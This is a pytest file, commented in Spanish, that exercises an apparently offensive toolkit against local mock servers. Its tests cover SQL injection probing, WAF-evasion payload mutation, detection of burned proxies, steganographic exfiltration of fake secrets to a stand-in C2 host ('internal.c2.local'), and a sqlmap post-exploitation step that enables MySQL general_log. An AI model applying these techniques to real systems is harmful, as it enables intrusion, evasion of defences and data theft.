import asyncio
import logging
import time
import pytest
from aiohttp import web, ClientSession
from dotenv import load_dotenv

from backend.engines.advanced_payload_adapter import AdvancedPayloadAdapter
from backend.engines.base import EngineConfig
from backend.offensiva.proxy_rotator import ProxyRotator
from backend.offensiva.evidence_exfil import EvidenceExfilOrchestrator

# helper to start the existing mock server from tests/mock_vuln_server
from backend.tests.mock_vuln_server import app as mock_vuln_app

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("test_effectiveness")


async def _run_mock_server(port=8081):
    runner = web.AppRunner(mock_vuln_app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", port)
    await site.start()
    return runner


@pytest.mark.asyncio
async def test_context_awareness_sql_suture():
    """Test 1: Validación de Conciencia de Contexto (P5‑A)

    - Se arranca el servidor vulnerable simulado y se inyecta un simple apóstrofe
      en el parámetro `id`.
    - Capturamos el texto devuelto por el mock y lo imprimimos (stack trace).
    """
    runner = await _run_mock_server()
    url = "http://127.0.0.1:8081/api/user"
    async with ClientSession() as sess:
        async with sess.get(url, params={"id": "1'"}) as resp:
            text = await resp.text()
            print("--- Test 1 response ---")
            print("Status code:", resp.status)
            print(text)
    await runner.cleanup()

    # el veredicto lo evaluará el analista manualmente según el texto imprimido


@pytest.mark.asyncio
async def test_semantic_evasion_symmetry():
    """Test 2: Simetría de Evasión Semántica (P5‑B)

    Se arranca un servidor que bloquea cualquier petición con la palabra UNION y se
    lanza el adaptador de payload dinámicos para que genere un payload.
    Medimos la latencia y status code, y mostramos el paquete enviado.
    """
    # servidor simple
    async def waf_handler(request):
        body = await request.text()
        if "UNION" in body.upper():
            return web.Response(status=403, text="blocked by WAF")
        return web.Response(status=200, text="ok")

    waf_app = web.Application()
    waf_app.router.add_post("/api/submit", waf_handler)
    runner = web.AppRunner(waf_app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 8082)
    await site.start()

    # generador de payloads con hint de concatenación dinámica
    config = EngineConfig(engine_id="advanced_payload", max_payloads=10, custom_params={"mutation_level": 2})
    adapter = AdvancedPayloadAdapter(config)
    vectors = [{"endpoint": "/api/submit", "parameter": "data", "payloads": ["1"]}]

    start = time.time()
    findings = await adapter.scan("http://127.0.0.1:8082", vectors)
    latency = (time.time() - start) * 1000

    print("--- Test 2 results ---")
    print(f"Round-trip latency: {latency:.0f} ms")
    for f in findings:
        print(f"payload sent: {f.payload}")
        print(f"response code: {f.http_status}")

    await runner.cleanup()


@pytest.mark.asyncio
async def test_resilience_to_tarpit():
    """Test 3: Resiliencia al Tarpit (P5‑D)

    Simulamos 20 peticiones contra un proxy tarpit e imprimimos el momento en que
    `is_burned` pasa a True.
    """
    rotator = ProxyRotator()
    proxy = "http://evil-tarpit.local:8080"
    rotator.add_proxy(proxy)

    print("--- Test 3 telemetry log ---")
    for i in range(1, 21):
        # latencia creciente para simular comportamiento sospechoso
        latency = 50 + i * 5
        was_blocked = (i % 3 == 0)
        rotator.record_telemetry(proxy, latency_ms=latency, was_blocked=was_blocked)
        # force evaluation every request
        await rotator.evaluate_fleet_safety()
        p = rotator.pool[0]
        print(f"request {i}: latency={latency} blocked={was_blocked} burned={p.is_burned}")
        if p.is_burned:
            print(f"node marked burned on request {i}")
            break


@pytest.mark.asyncio
async def test_stego_integrity():
    """Test 4: Integridad de Exfiltración Esteganográfica (P5‑C)

    Generamos 50 filas de datos ficticios y ejecutamos el motor de estego;
    imprimimos un fragmento del texto final y comprobamos la reconstrucción.
    """
    data = "\n".join([f"row{i}:SECRET" for i in range(50)]).encode()
    orchestrator = EvidenceExfilOrchestrator(c2_url="http://internal.c2.local")
    theme = "reseña de restaurante"  # modo especificado por la prueba
    payload = await orchestrator._prepare_payload(data=data, filename="table.txt", use_ai=False, theme=theme)
    print("--- Test 4 payload snippet ---")
    text = payload.decode(errors="ignore")
    print(text[:1000])
    # la reconstrucción se haría en el C2 real; aquí solo devolvemos el base64


@pytest.mark.asyncio
async def test_privilege_escalation_log_injection():
    """Test 5: Escalado de Privilegios (Post‑Explotación)

    Ejecutamos un paso de post-exploit que intenta habilitar general_log. El
    servidor simulado puede devolver "Access denied".
    """
    class DummyBroadcaster:
        async def __call__(self, comp, level, msg, meta=None):
            logger.info(f"[{comp}] {level} {msg}")

    engine = __import__("backend.post_exploitation", fromlist=["PostExploitationEngine"]).PostExploitationEngine
    # simulamos el comando que ejecutaría sqlmap para enviar SET GLOBAL
    # en un entorno real, sqlmap gestionaría la conexión a la base de datos
    post = engine(base_cmd=["echo", "SET GLOBAL general_log = 'ON';"], scan_id="test", broadcast_fn=DummyBroadcaster())
    result = await post._run_sqlmap_step("privilege_check", ["--sql-query=SET GLOBAL general_log = 'ON';"], timeout=5)
    print("--- Test 5 result ---")
    print(result)


if __name__ == "__main__":
    load_dotenv()
    # ejecuta todos los tests en secuencia
    asyncio.run(test_context_awareness_sql_suture())
    asyncio.run(test_semantic_evasion_symmetry())
    asyncio.run(test_resilience_to_tarpit())
    asyncio.run(test_stego_integrity())
    asyncio.run(test_privilege_escalation_log_injection())
